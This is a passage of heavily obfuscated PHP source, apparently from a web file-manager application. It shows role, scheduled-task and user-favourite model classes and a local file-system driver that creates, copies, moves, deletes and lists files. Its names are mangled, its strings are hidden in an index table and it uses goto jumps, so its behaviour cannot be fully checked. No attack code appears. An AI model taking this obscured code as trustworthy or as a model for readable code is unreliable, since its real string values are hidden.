$Ğä²İò); } public function remove($€Ò¶¦™) { $ì‡óï¹ = parent::listData($€Ò¶¦™); if (!$ì‡óï¹ || $ì‡óï¹[$_SERVER[º·Ï‹¥³][182]]) { return !1; } return parent::remove($€Ò¶¦™); } public function add($Ò­ğ¿Ì¶) { $»æµ™€Ç =& $_SERVER[º·Ï‹¥³]; $¯àà¢òİ = $Ò­ğ¿Ì¶[$»æµ™€Ç[32]]; if ($this->findByName($¯àà¢òİ)) { return !1; } $óÙ½¢ = array($»æµ™€Ç[478] => $¯àà¢òİ, $»æµ™€Ç[1958] => $»æµ™€Ç[12], $»æµ™€Ç[1954] => $»æµ™€Ç[1962], $»æµ™€Ç[2424] => 1, $»æµ™€Ç[1957] => 0, $»æµ™€Ç[2425] => 0, $»æµ™€Ç[1956] => $this->getSort()); $Ò­ğ¿Ì¶ = array_merge($óÙ½¢, $Ò­ğ¿Ì¶); $this->filterAuth($Ò­ğ¿Ì¶[$»æµ™€Ç[471]]); return parent::insert($Ò­ğ¿Ì¶); } private function getSort() { $×˜œÏï² =& $_SERVER[º·Ï‹¥³]; $”×òÔµ = parent::listData(); $×è¡İ—Å = array_to_keyvalue($”×òÔµ, $×˜œÏï²[12], $×˜œÏï²[1976]); return empty($×è¡İ—Å) ? 0 : max($×è¡İ—Å) + 1; } private function filterAuth(&$Ïí´‘Ù—) { $–ä´ª½´ =& $_SERVER[º·Ï‹¥³]; $ß‡å¯é = array(); $„Şëõ  = array_filter(explode($–ä´ª½´[50], $Ïí´‘Ù—)); foreach ($„Şëõ  as $Ïí´‘Ù—) { $İ ç°§ = explode($–ä´ª½´[10], $Ïí´‘Ù—); if ($İ ç°§[0] == $–ä´ª½´[2426] && $İ ç°§[1] != $–ä´ª½´[1243]) { $Ìá·Õ£¤ = $İ ç°§[0] . $–ä´ª½´[10] . $İ ç°§[1] . $–ä´ª½´[2427]; if (!in_array($Ìá·Õ£¤, $„Şëõ )) { $ß‡å¯é[] = $Ìá·Õ£¤; } } $ß‡å¯é[] = $Ïí´‘Ù—; } $Ïí´‘Ù— = implode($–ä´ª½´[50], $ß‡å¯é); } public function findRoleDefault() { $©İò¶© =& $_SERVER[º·Ï‹¥³]; $úÒóËş = parent::listData(); $¤Ú•è§ = !1; foreach ($úÒóËş as $ë”ßª¡) { if (!$ë”ßª¡ || $ë”ßª¡[$©İò¶©[1974]] == $©İò¶©[219] || $ë”ßª¡[$©İò¶©[2160]] == 1) { continue; } if (strstr($ë”ßª¡[$©İò¶©[471]], $©İò¶©[2428])) { continue; } if (!strstr($ë”ßª¡[$©İò¶©[471]], $©İò¶©[2429])) { continue; } if (!$¤Ú•è§) { $¤Ú•è§ = $ë”ßª¡; continue; } $££Áîùæ = explode($©İò¶©[50], $¤Ú•è§[$©İò¶©[471]]); $¿‰ª­É‰ = explode($©İò¶©[50], $ë”ßª¡[$©İò¶©[471]]); if (count($££Áîùæ) > count($¿‰ª­É‰)) { $¤Ú•è§ = $ë”ßª¡; } } return $¤Ú•è§ ? $¤Ú•è§[$©İò¶©[459]] : $©İò¶©[12]; } public function sort($ãéÓ¦÷, $¦ÊËãµÍ) { return parent::update($ãéÓ¦÷, $¦ÊËãµÍ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x74\x61\x73\x6b\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\x74\171\x70\x65", "\x65\x76\145\x6e\164", "\164\151\155\145", "\x64\145\x73\143", "\x73\x79\x73\x74\x65\155", "\145\x6e\x61\142\x6c\x65", "\154\141\163\164\x52\x75\156", "\x73\157\162\x74"); public function listData($‡õ¡ú‰İ = false, $ïÅğ»Á = "\x73\157\x72\x74", $ğÄÈôŞÆ = false) { return parent::listData($‡õ¡ú‰İ, $ïÅğ»Á, $ğÄÈôŞÆ); } public function add($±“Û¥Ÿ¤) { $ãÖä¡ « =& $_SERVER[º·Ï‹¥³]; $Ñ¥æÄ©’ = $this->findByName($±“Û¥Ÿ¤[$ãÖä¡ «[32]]); if ($Ñ¥æÄ©’) { return !1; } $±“Û¥Ÿ¤[$ãÖä¡ «[1705]] = 0; $±“Û¥Ÿ¤[$ãÖä¡ «[1976]] = $this->getSort(); return parent::insert($±“Û¥Ÿ¤); } private function getSort() { $ÁŸÖï½Ü =& $_SERVER[º·Ï‹¥³]; $ıø³¥¼· = parent::listData(); $ØÂ¶ü«Ñ = array_to_keyvalue($ıø³¥¼·, $ÁŸÖï½Ü[12], $ÁŸÖï½Ü[1976]); return empty($ØÂ¶ü«Ñ) ? 0 : max($ØÂ¶ü«Ñ) + 1; } public function update($İÛÒŒ±², $’ÓÛÈáÙ) { $¾ƒªÓğ… =& $_SERVER[º·Ï‹¥³]; $­”ŠÓ†Ú = $this->listData($İÛÒŒ±²); $¥Â”ÆˆÆ = $this->findByName($’ÓÛÈáÙ[$¾ƒªÓğ…[32]]); if (!$­”ŠÓ†Ú || $¥Â”ÆˆÆ && $¥Â”ÆˆÆ[$¾ƒªÓğ…[459]] != $­”ŠÓ†Ú[$¾ƒªÓğ…[459]]) { return !1; } return parent::update($İÛÒŒ±², $’ÓÛÈáÙ); } public function remove($Ç¥ê‚µ”, $±ÓùÕ½¾ = false) { $ğ¹‚´¨Ü =& $_SERVER[º·Ï‹¥³]; $ßœ«ç³õ = $this->listData($Ç¥ê‚µ”); if (!$ßœ«ç³õ) { return; } if (!$±ÓùÕ½¾ && $ßœ«ç³õ[$ğ¹‚´¨Ü[182]] == $ğ¹‚´¨Ü[91]) { return !1; } return parent::remove($Ç¥ê‚µ”); } public function enable($Ãì¥Ö¯¦, $²Ãâ­ˆ“) { return $this->update($Ãì¥Ö¯¦, array($_SERVER[º·Ï‹¥³][2418] => $²Ãâ­ˆ“)); } public function run($’ËÓ¿¤£) { return $this->update($’ËÓ¿¤£, array($_SERVER[º·Ï‹¥³][2430] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($©¸´Î×) { $˜§ãà—Ñ =& $_SERVER[º·Ï‹¥³]; return array($˜§ãà—Ñ[2068] => array(USER_ID, $˜§ãà—Ñ[2431])); } protected function listData() { $ŞÒ´Ø¾“ =& $_SERVER[º·Ï‹¥³]; $Û­Ê‰…‘ = array($ŞÒ´Ø¾“[1745] => USER_ID, $ŞÒ´Ø¾“[542] => 0); $™ôÔúïà = $ŞÒ´Ø¾“[2432]; $ıóÌö ù = $this->field($™ôÔúïà)->where($Û­Ê‰…‘)->order($ŞÒ´Ø¾“[2433])->select(); return $ıóÌö ù ? $ıóÌö ù : array(); } protected function resetCache() { } protected function listView() { $«›ÜŒŒ• =& $_SERVER[º·Ï‹¥³]; $×ˆŸØÕ = $this->listData(); $¥ıŠÁô« = array_filter_by_field($×ˆŸØÕ, $«›ÜŒŒ•[33], $«›ÜŒŒ•[474]); $«Æã†ìÀ = array_to_keyvalue($¥ıŠÁô«, $«›ÜŒŒ•[12], $«›ÜŒŒ•[87]); if (!$«Æã†ìÀ) { return $×ˆŸØÕ; } $ê³Âã‘ = 2000; $üÇµ¼ÑÙ = array($«›ÜŒŒ•[475] => array($«›ÜŒŒ•[476], $«Æã†ìÀ)); $Š´Ù›¬Ô = Model($«›ÜŒŒ•[876])->listSource($üÇµ¼ÑÙ, $ê³Âã‘); $Š´Ù›¬Ô = array_merge($Š´Ù›¬Ô[$«›ÜŒŒ•[86]], $Š´Ù›¬Ô[$«›ÜŒŒ•[85]]); $Š´Ù›¬Ô = array_to_keyvalue($Š´Ù›¬Ô, $«›ÜŒŒ•[184]); foreach ($×ˆŸØÕ as $¢é¹ØÎ => $‡¸·¢Ë“) { $Ô­âæ£— = $Š´Ù›¬Ô[$‡¸·¢Ë“[$«›ÜŒŒ•[87]]]; $Ô­âæ£— = $Ô­âæ£— ? $Ô­âæ£— : array(); $×ˆŸØÕ[$¢é¹ØÎ] = array_merge($Ô­âæ£—, $‡¸·¢Ë“); } return $×ˆŸØÕ; } protected function addFav($½–Ôâ–, $È¿á‘õŒ = '', $šæ×¬Âİ = "\163\x6f\165\162\x63\145") { $¹¸¬¶©– =& $_SERVER[º·Ï‹¥³]; $ù‡¢Å± = array($¹¸¬¶©–[1745] => USER_ID, $¹¸¬¶©–[542] => 0, $¹¸¬¶©–[480] => $šæ×¬Âİ, $¹¸¬¶©–[479] => $½–Ôâ–); if ($this->where($ù‡¢Å±)->find()) { return !1; } $ù‡¢Å± = array($¹¸¬¶©–[1745] => USER_ID, $¹¸¬¶©–[542] => 0); $©¡¡¤à¿ = $this->where($ù‡¢Å±)->max($¹¸¬¶©–[1976]); if (!$©¡¡¤à¿) { $©¡¡¤à¿ = 0; } if (!$È¿á‘õŒ && $šæ×¬Âİ == $¹¸¬¶©–[474]) { $Ğº­ÇˆÚ = Model($¹¸¬¶©–[1388])->where(array($¹¸¬¶©–[475] => $½–Ôâ–))->find(); if (!$Ğº­ÇˆÚ) { return !1; } $È¿á‘õŒ = $Ğº­ÇˆÚ[$¹¸¬¶©–[32]]; } $È¿á‘õŒ = $this->getAutoName($È¿á‘õŒ); $¸œ¦Šèğ = array($¹¸¬¶©–[1745] => USER_ID, $¹¸¬¶©–[542] => 0, $¹¸¬¶©–[478] => $È¿á‘õŒ, $¹¸¬¶©–[479] => $½–Ôâ–, $¹¸¬¶©–[480] => $šæ×¬Âİ, $¹¸¬¶©–[1956] => $©¡¡¤à¿ + 1); return $this->add($¸œ¦Šèğ); } protected function remove($õç İß) { $ß¨š¹ü =& $_SERVER[º·Ï‹¥³]; $Ûçúâ¨¯ = array($ß¨š¹ü[1745] => USER_ID, $ß¨š¹ü[477] => $õç İß); return $this->where($Ûçúâ¨¯)->delete(); } protected function removeByName($ÚÉÎÍÍ) { $¸—‡²õé =& $_SERVER[º·Ï‹¥³]; $­“‚¡ï = array($¸—‡²õé[1745] => USER_ID, $¸—‡²õé[478] => $ÚÉÎÍÍ, $¸—‡²õé[542] => 0); return $this->where($­“‚¡ï)->delete(); } protected function rename($¾ÜÉñôè, $ÂçÓ°›‹) { $¬Ç¶Ğ ¦ =& $_SERVER[º·Ï‹¥³]; if ($¾ÜÉñôè == $ÂçÓ°›‹) { return !1; } $¾Í—‚‹‚ = $this->getAutoName($ÂçÓ°›‹); if ($ÂçÓ°›‹ != $¾Í—‚‹‚) { return !1; } $Î¬¦ = array($¬Ç¶Ğ ¦[1745] => USER_ID, $¬Ç¶Ğ ¦[542] => 0, $¬Ç¶Ğ ¦[32] => $¾ÜÉñôè); return $this->where($Î¬¦)->save(array($¬Ç¶Ğ ¦[32] => $ÂçÓ°›‹)); } protected function resetSort($ùóß„Èê) { $èËêş¨¢ =& $_SERVER[º·Ï‹¥³]; $ùóß„Èê = is_array($ùóß„Èê) ? $ùóß„Èê : array(); $ƒøÌŸØ = array($èËêş¨¢[1745] => USER_ID); for ($½¤³ß£¨ = 0; $½¤³ß£¨ < count($ùóß„Èê); $½¤³ß£¨++) { $ƒøÌŸØ[$èËêş¨¢[477]] = $ùóß„Èê[$½¤³ß£¨]; $this->where($ƒøÌŸØ)->save(array($èËêş¨¢[1956] => $½¤³ß£¨ + 1)); } return !0; } protected function moveTop($œ¬¥İÔâ) { $õ¨ÛíÕò =& $_SERVER[º·Ï‹¥³]; $ù¢áàˆ¾ = array($õ¨ÛíÕò[1745] => USER_ID, $õ¨ÛíÕò[542] => 0); $î²ìòì = $this->where($ù¢áàˆ¾)->where(array($õ¨ÛíÕò[32] => $œ¬¥İÔâ))->find(); if (!$î²ìòì) { return; } $¨ıšËùÛ = $this->field($õ¨ÛíÕò[459])->where($ù¢áàˆ¾)->order($õ¨ÛíÕò[2433])->select(); $¨ıšËùÛ = array_to_keyvalue($¨ıšËùÛ, $õ¨ÛíÕò[12], $õ¨ÛíÕò[459]); $´±®æôğ = $¨ıšËùÛ; $¨ıšËùÛ = array_remove_value($¨ıšËùÛ, $î²ìòì[$õ¨ÛíÕò[459]]); array_unshift($¨ıšËùÛ, $î²ìòì[$õ¨ÛíÕò[459]]); return $this->resetSort($¨ıšËùÛ); } protected function moveBottom($‰°ÍÍ€) { $ôİÍÏ× =& $_SERVER[º·Ï‹¥³]; $½¶£®ÊÚ = array($ôİÍÏ×[1745] => USER_ID, $ôİÍÏ×[542] => 0); $È­šÑ = $this->where($½¶£®ÊÚ)->max($ôİÍÏ×[1976]); $úĞÀÄ¾Ó = array($ôİÍÏ×[1976] => $È­šÑ + 1); return $this->where($½¶£®ÊÚ)->where(array($ôİÍÏ×[32] => $‰°ÍÍ€))->save($úĞÀÄ¾Ó); } private function getAutoName($«şãåÖÏ) { $·­Í®ä‡ =& $_SERVER[º·Ï‹¥³]; $÷¾•­Úê = array($·­Í®ä‡[1745] => USER_ID, $·­Í®ä‡[542] => 0); $ì´ğ´¦ = $this->field($·­Í®ä‡[32])->where($÷¾•­Úê)->select(); $ì´ğ´¦ = array_to_keyvalue($ì´ğ´¦, $·­Í®ä‡[12], $·­Í®ä‡[32]); if (!$ì´ğ´¦ || !in_array($«şãåÖÏ, $ì´ğ´¦)) { return $«şãåÖÏ; } for ($İÆ´¼‘® = 0; $İÆ´¼‘® < count($ì´ğ´¦); $İÆ´¼‘®++) { if (!in_array($«şãåÖÏ . "\50{$İÆ´¼‘®}\51", $ì´ğ´¦)) { return $«şãåÖÏ . "\50{$İÆ´¼‘®}\51"; } } return $«şãåÖÏ . "\50{$İÆ´¼‘®}\x29"; } } goto EìŸƒ±Ïë; cğÂÂÚœœ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($…²ù÷ëº) { if (substr($…²ù÷ëº, 0, 2) == $_SERVER[º·Ï‹¥³][1409]) { $…²ù÷ëº = BASIC_PATH . substr($…²ù÷ëº, 2); } return $…²ù÷ëº; } public function iconvApp($ê×¹¥¸Ğ) { $û“êåÒĞ =& $_SERVER[º·Ï‹¥³]; global $config; return $this->iconvTo($ê×¹¥¸Ğ, $config[$û“êåÒĞ[1407]], $config[$û“êåÒĞ[1406]]); } public function iconvSystem($œÈ˜¸ˆ™) { $»´¹¦²ê =& $_SERVER[º·Ï‹¥³]; global $config; return $this->iconvTo($œÈ˜¸ˆ™, $config[$»´¹¦²ê[1406]], $config[$»´¹¦²ê[1407]]); } public function getPathOuter($Óğüçà²) { $ ó¥¼´¿ =& $_SERVER[º·Ï‹¥³]; $—â—áî‰ = $this->iconvApp($this->pathBase); $Óğüçà² = $this->iconvApp($Óğüçà²); if (substr($—â—áî‰, 0, 2) == $ ó¥¼´¿[1409]) { $—â—áî‰ = BASIC_PATH . substr($—â—áî‰, 2); } if (substr($Óğüçà², 0, 2) == $ ó¥¼´¿[1409]) { $Óğüçà² = BASIC_PATH . substr($Óğüçà², 2); } $—â—áî‰ = KodIO::clear($—â—áî‰); $Óğüçà² = KodIO::clear($Óğüçà²); $Óğüçà² = substr($Óğüçà², strlen($—â—áî‰)); if (empty($this->pathDriver)) { return $Óğüçà²; } return $this->pathDriver . $ ó¥¼´¿[8] . ltrim($Óğüçà², $ ó¥¼´¿[8]); } public function mkfile($å‡ùÒŸü, $Âæã«¯  = '', $‡¸©­ÀÇ = REPEAT_RENAME) { $å‡ùÒŸü = $this->iconvSystem($å‡ùÒŸü); @touch($å‡ùÒŸü); if ($Âæã«¯ ) { file_put_contents($å‡ùÒŸü, $Âæã«¯ ); } @chmod($å‡ùÒŸü, $this->pathAuth); if (is_file($å‡ùÒŸü)) { return $this->getPathOuter($å‡ùÒŸü); } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } public function mkdir($ëéĞÚ–˜, $‰äÉÕÑé = REPEAT_SKIP) { $ëéĞÚ–˜ = $this->iconvSystem($ëéĞÚ–˜); if (is_dir($ëéĞÚ–˜)) { return $this->getPathOuter($ëéĞÚ–˜); } @mkdir($ëéĞÚ–˜, $this->pathAuth, !0); @chmod($ëéĞÚ–˜, $this->pathAuth); if (is_dir($ëéĞÚ–˜)) { return $this->getPathOuter($ëéĞÚ–˜); } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } public function copyFile($´ÚÖˆÂ, $§õğŠ‰) { $this->mkdir($this->pathFather($§õğŠ‰)); $´ÚÖˆÂ = $this->iconvSystem($´ÚÖˆÂ); $§õğŠ‰ = $this->iconvSystem($§õğŠ‰); $Úß¿Õ¹Ó = copy_64($´ÚÖˆÂ, $§õğŠ‰); @chmod($§õğŠ‰, $this->pathAuth); if ($Úß¿Õ¹Ó) { return $this->getPathOuter($§õğŠ‰); } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } public function moveFile($¦Çòî«„, $æƒÔà”ø) { $this->mkdir($this->pathFather($æƒÔà”ø)); $¦Çòî«„ = $this->iconvSystem($¦Çòî«„); $æƒÔà”ø = $this->iconvSystem($æƒÔà”ø); $ïõå ã = intval(@rename($¦Çòî«„, $æƒÔà”ø)); if (!$ïõå ã) { if ($ïõå ã = intval(@copy_64($¦Çòî«„, $æƒÔà”ø))) { @unlink($¦Çòî«„); } } @chmod($æƒÔà”ø, $this->pathAuth); if ($ïõå ã) { return $this->getPathOuter($æƒÔà”ø); } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } public function movePath($¬È§şëœ, $éºÊ…õ, $ƒ²‘ñ¡ = false) { $¿›¬˜êÍ =& $_SERVER[º·Ï‹¥³]; $¬È§şëœ = $this->iconvSystem($¬È§şëœ); $éºÊ…õ = $this->iconvSystem($éºÊ…õ); $‡„²Ü»À = rtrim($éºÊ…õ, $¿›¬˜êÍ[8]) . $¿›¬˜êÍ[8] . ($ƒ²‘ñ¡ ? $ƒ²‘ñ¡ : get_path_this($¬È§şëœ)); if (file_exists($‡„²Ü»À)) { return !1; } $Œ£Ğúïà = intval(@rename($¬È§şëœ, $‡„²Ü»À)); $Œ£Ğúïà = file_exists($‡„²Ü»À); if ($Œ£Ğúïà) { return $this->getPathOuter($‡„²Ü»À); } $this->writeLog(__FUNCTION__ . $¿›¬˜êÍ[1419], !0); return !1; } public function delFile($öĞ£©ùï) { $öĞ£©ùï = $this->iconvSystem($öĞ£©ùï); if (!@unlink($öĞ£©ùï)) { @chmod($öĞ£©ùï, $this->pathAuth); if (@unlink($öĞ£©ùï)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } return !0; } public function delFolder($˜ñ±Æá±) { $à‚°åû» =& $_SERVER[º·Ï‹¥³]; $˜ñ±Æá± = $this->iconvSystem($˜ñ±Æá±); if (!is_dir($˜ñ±Æá±)) { return !0; } if (!($¬°¡ìÇ– = opendir($˜ñ±Æá±))) { return !1; } while (($¼¯„şÕ = readdir($¬°¡ìÇ–)) !== !1) { if ($¼¯„şÕ == $à‚°åû»[10] || $¼¯„şÕ == $à‚°åû»[1331]) { continue; } $ı¢ÕÄÂ‚ = $˜ñ±Æá± . $à‚°åû»[8] . $¼¯„şÕ; if (is_file($ı¢ÕÄÂ‚) || is_link($ı¢ÕÄÂ‚)) { if (!unlink($ı¢ÕÄÂ‚)) { chmod($ı¢ÕÄÂ‚, $this->pathAuth); if (!unlink($ı¢ÕÄÂ‚)) { return !1; } } } else { if (is_dir($ı¢ÕÄÂ‚)) { chmod($ı¢ÕÄÂ‚, $this->pathAuth); $ı¢ÕÄÂ‚ = $this->iconvApp($ı¢ÕÄÂ‚); if (!$this->delFolder($ı¢ÕÄÂ‚)) { return !1; } } } } closedir($¬°¡ìÇ–); return rmdir($˜ñ±Æá±); } public function rename($ğ‘åáÑ‡, $ìÁ¿Ö“) { $­’ôäÃ =& $_SERVER[º·Ï‹¥³]; $³­ı’£Ë = $this->fileNameAuto($this->pathFather($ğ‘åáÑ‡), $ìÁ¿Ö“); $³­ı’£Ë = $this->iconvSystem($³­ı’£Ë); $ğ‘åáÑ‡ = $this->iconvSystem($ğ‘åáÑ‡); $ÂÎÎÒª = $this->pathFather($ğ‘åáÑ‡); $şÕĞÛÜÓ = rtrim($ÂÎÎÒª, $­’ôäÃ[8]) . $­’ôäÃ[8] . $³­ı’£Ë; $…—Ë¢™ = @rename($ğ‘åáÑ‡, $şÕĞÛÜÓ); $şÕĞÛÜÓ = $this->iconvApp($şÕĞÛÜÓ); if ($…—Ë¢™) { return $this->getPathOuter($şÕĞÛÜÓ); } $this->writeLog(__FUNCTION__ . $­’ôäÃ[1419], !0); return !1; } public function size($’¿Ùş±º) { $’¿Ùş±º = $this->iconvSystem($’¿Ùş±º); return filesize_64($’¿Ùş±º); } public function info($êïúò¢) { $êïúò¢ = $this->iconvSystem($êïúò¢); if ($this->isFolder($êïúò¢)) { return $this->folderInfo($êïúò¢); } else { if ($this->isFile($êïúò¢)) { return $this->fileInfo($êïúò¢); } } return !1; } protected function infoChildren($À‡Ÿâ‚ü, &$æÎªÓËú, $ÃìÁú¶ü = true) { $¥€ğøÅÅ =& $_SERVER[º·Ï‹¥³]; check_abort_echo(); $À‡Ÿâ‚ü = rtrim($À‡Ÿâ‚ü, $¥€ğøÅÅ[8]) . $¥€ğøÅÅ[8]; if ($ÃìÁú¶ü) { $À‡Ÿâ‚ü = $this->iconvSystem($À‡Ÿâ‚ü); } if (!($¾éïíÑÖ = @opendir($À‡Ÿâ‚ü))) { return; } while (($ ôœ„üÛ = readdir($¾éïíÑÖ)) !== !1) { if ($ ôœ„üÛ == $¥€ğøÅÅ[10] || $ ôœ„üÛ == $¥€ğøÅÅ[1331]) { continue; } $œ„ùÃ¿ = $À‡Ÿâ‚ü . $ ôœ„üÛ; if (is_file($œ„ùÃ¿) || is_link($œ„ùÃ¿)) { $æÎªÓËú[$¥€ğøÅÅ[80]]++; $æÎªÓËú[$¥€ğøÅÅ[79]] += filesize_64($œ„ùÃ¿); } else { if (is_dir($œ„ùÃ¿)) { $æÎªÓËú[$¥€ğøÅÅ[81]]++; $this->infoChildren($œ„ùÃ¿, $æÎªÓËú, !1); } } } closedir($¾éïíÑÖ); } private function folderInfo($ùÁ„å†¯, $£§ßÈö× = false) { $àïÁíÉ =& $_SERVER[º·Ï‹¥³]; $ùÁ„å†¯ = rtrim($ùÁ„å†¯, $àïÁíÉ[8]) . $àïÁíÉ[8]; $úÏõ Ğı = $this->iconvApp($this->pathThis($ùÁ„å†¯)); if ($£§ßÈö×) { return array($àïÁíÉ[32] => $úÏõ Ğı, $àïÁíÉ[87] => $this->getPathOuter($ùÁ„å†¯), $àïÁíÉ[33] => $àïÁíÉ[78]); } $º¿ƒï¸õ = array($àïÁíÉ[32] => $úÏõ Ğı, $àïÁíÉ[87] => $this->getPathOuter($ùÁ„å†¯), $àïÁíÉ[33] => $àïÁíÉ[78], $àïÁíÉ[222] => @filectime($ùÁ„å†¯), $àïÁíÉ[88] => @filemtime($ùÁ„å†¯), $àïÁíÉ[1423] => @fileatime($ùÁ„å†¯), $àïÁíÉ[1424] => is_readable($ùÁ„å†¯), $àïÁíÉ[1425] => is_writable($ùÁ„å†¯), $àïÁíÉ[1426] => get_mode($ùÁ„å†¯)); return $º¿ƒï¸õ; } private function fileInfo($è†¶Àä, $Ô¼Íî = false) { $â¦˜ºÌ =& $_SERVER[º·Ï‹¥³]; $¶‰ çÄ = $this->iconvApp($this->pathThis($è†¶Àä)); if ($Ô¼Íî) { return array($â¦˜ºÌ[32] => $¶‰ çÄ, $â¦˜ºÌ[87] => $this->getPathOuter($è†¶Àä), $â¦˜ºÌ[33] => $â¦˜ºÌ[221], $â¦˜ºÌ[79] => $this->size($è†¶Àä), $â¦˜ºÌ[178] => $this->ext($¶‰ çÄ)); } $ìû›ı´ = array($â¦˜ºÌ[32] => $¶‰ çÄ, $â¦˜ºÌ[87] => $this->getPathOuter($è†¶Àä), $â¦˜ºÌ[33] => $â¦˜ºÌ[221], $â¦˜ºÌ[222] => @filectime($è†¶Àä), $â¦˜ºÌ[88] => @filemtime($è†¶Àä), $â¦˜ºÌ[1423] => @fileatime($è†¶Àä), $â¦˜ºÌ[79] => $this->size($è†¶Àä), $â¦˜ºÌ[178] => $this->ext($¶‰ çÄ), $â¦˜ºÌ[1424] => is_readable($è†¶Àä), $â¦˜ºÌ[1425] => is_writable($è†¶Àä), $â¦˜ºÌ[1426] => get_mode($è†¶Àä)); return $ìû›ı´; } public function exist($ ©ÕùÈŸ) { $ ©ÕùÈŸ = $this->iconvSystem($ ©ÕùÈŸ); return @file_exists($ ©ÕùÈŸ); } public function isFile($Áğ˜–ûè) { $Áğ˜–ûè = $this->iconvSystem($Áğ˜–ûè); return @is_file($Áğ˜–ûè); } public function isFolder($Àõ¯à‡”) { $Àõ¯à‡” = $this->iconvSystem($Àõ¯à‡”); return @is_dir($Àõ¯à‡”); } public function listPath($ëòÂáµ±, $¾òåªûú = false) { $éÉÍï € =& $_SERVER[º·Ï‹¥³]; $ëòÂáµ± = $this->iconvSystem($ëòÂáµ±); $ëòÂáµ± = rtrim($ëòÂáµ±, $éÉÍï €[8]) . $éÉÍï €[8]; $ÙßŞ±à = array($éÉÍï €[85] => array(), $éÉÍï €[86] => array()); if (!($Ã±àõ•î = @opendir($ëòÂáµ±))) { return $ÙßŞ±à; } while (($›’¦Ú¸· = readdir($Ã±àõ•î)) !== !1) { if ($›’¦Ú¸· == $éÉÍï €[10] || $›’¦Ú¸· == $éÉÍï €[1331]) { continue; } $Û®ø†ÕÔ = $ëòÂáµ± . $›’¦Ú¸·; if (is_file($Û®ø†ÕÔ)) { $ÙßŞ±à[$éÉÍï €[86]][] = $this->fileInfo($Û®ø†ÕÔ, $¾òåªûú); } else { $ÙßŞ±à[$éÉÍï €[85]][] = $this->folderInfo($Û®ø†ÕÔ, $¾òåªûú); } } closedir($Ã±àõ•î); return $ÙßŞ±à; } public function listAll($Äƒçƒ—š, &$‹Ğµ”’ú = array()) { $è´îªó“ =& $_SERVER[º·Ï‹¥³]; $Äƒçƒ—š = $this->iconvSystem($Äƒçƒ—š); $Äƒçƒ—š = rtrim($Äƒçƒ—š, $è´îªó“[8]) . $è´îªó“[8]; if (!($íï£Ü‡Ñ = @opendir($Äƒçƒ—š))) { return $‹Ğµ”’ú; } while (($²ûƒÇŞ = readdir($íï£Ü‡Ñ)) !== !1) { if ($²ûƒÇŞ == $è´îªó“[10] || $²ûƒÇŞ == $è´îªó“[1331]) { continue; } $ôÑœ°¦‚ = $Äƒçƒ—š . $²ûƒÇŞ; $¸ñ––Õ = is_dir($ôÑœ°¦‚) && !is_link($ôÑœ°¦‚) ? 1 : 0; $ôÑœ°¦‚ = $¸ñ––Õ ? $ôÑœ°¦‚ . $è´îªó“[8] : $ôÑœ°¦‚; $‹Ğµ”’ú[] = array($è´îªó“[87] => $ôÑœ°¦‚, $è´îªó“[78] => $¸ñ––Õ, $è´îªó“[88] => intval(@filemtime($ôÑœ°¦‚)), $è´îªó“[79] => $¸ñ––Õ ? 0 : intval($this->size($ôÑœ°¦‚))); if ($¸ñ––Õ) { $this->listAll($ôÑœ°¦‚, $‹Ğµ”’ú); } } closedir($íï£Ü‡Ñ); return $‹Ğµ”’ú; } public function has($Œé’è¯Ó, $ÌÑòå¨û = false, $¨Ö•§›€ = true) { $ºÑÒ³¼ë =& $_SERVER[º·Ï‹¥³]; $Œé’è¯Ó = $this->iconvSystem($Œé’è¯Ó); $Œé’è¯Ó = rtrim($Œé’è¯Ó, $ºÑÒ³¼ë[8]) . $ºÑÒ³¼ë[8]; if (!($Àˆ†ÈÄ = @opendir($Œé’è¯Ó))) { return !1; } $¨ïÚåà = 0; $ı¥áäğİ = 0; $æÎÑ°Ğ = 0; while (($Øî”ŒÌº = readdir($Àˆ†ÈÄ)) !== !1) { if ($Øî”ŒÌº == $ºÑÒ³¼ë[10] || $Øî”ŒÌº == $ºÑÒ³¼ë[1331]) { continue; } $“ÛãÛ» = $Œé’è¯Ó . $Øî”ŒÌº; if ($ÌÑòå¨û) { $æÎÑ°Ğ++; if (@is_file($“ÛãÛ»)) { $¨ïÚåà++; } else { $ı¥áäğİ++; } if ($æÎÑ°Ğ > 10000) { break; } continue; } if ($¨Ö•§›€) { if (@is_file($“ÛãÛ»)) { return !0; } } else { if (@is_dir($“ÛãÛ» . $ºÑÒ³¼ë[8])) { return !0; } } } closedir($Àˆ†ÈÄ); if ($ÌÑòå¨û) { return array($ºÑÒ³¼ë[230] => $¨ïÚåà, $ºÑÒ³¼ë[231] => $ı¥áäğİ); } return !1; } public function hashSimple($ºíÃê÷²) { $¦º€º«² =& $_SERVER[º·Ï‹¥³]; if (!$ºíÃê÷²) { return md5($¦º€º«²[12]); } $ºíÃê÷² = $this->iconvSystem($ºíÃê÷²); $æè»½Öõ = $this->size($ºíÃê÷²); $ãÔØù¬ß = 200; $ì÷ ß×— = 50; if ($æè»½Öõ <= $ãÔØù¬ß * $ì÷ ß×—) { return $this->hashMd5($ºíÃê÷²) . $æè»½Öõ; } $„°ŸŞº• = $¦º€º«²[12]; $¼³‰¶‘ = intval($æè»½Öõ / $ì÷ ß×—); $ïÊ¬³ = fopen($ºíÃê÷², $¦º€º«²[1427]); if (!$ïÊ¬³) { return $„°ŸŞº•; } for ($€‹ÇÅõó = 0; $€‹ÇÅõó < $ì÷ ß×—; $€‹ÇÅõó++) { fseek_64($ïÊ¬³, $¼³‰¶‘ * $€‹ÇÅõó); $„°ŸŞº• .= fread($ïÊ¬³, $ãÔØù¬ß); } fseek_64($ïÊ¬³, $æè»½Öõ - $ãÔØù¬ß); $„°ŸŞº• .= fread($ïÊ¬³, $ãÔØù¬ß); fclose($ïÊ¬³); return md5($„°ŸŞº•) . $æè»½Öõ; } public function 